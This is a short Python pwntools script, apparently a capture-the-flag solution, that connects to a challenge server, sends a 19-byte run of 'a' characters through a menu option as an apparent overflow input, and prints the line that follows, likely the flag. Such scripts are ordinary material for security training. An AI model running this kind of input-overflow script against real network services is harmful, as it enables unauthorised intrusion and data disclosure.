from pwn import *

r = remote("thewall.challs.olicyber.it", 21007)

r.sendlineafter(b"option: ", b"1")
r.recv(1000)
r.sendline(b"a" * 19)

r.sendlineafter(b"option: ", b"2")
r.recvline()
r.recvline()
print(r.recvline().decode().strip())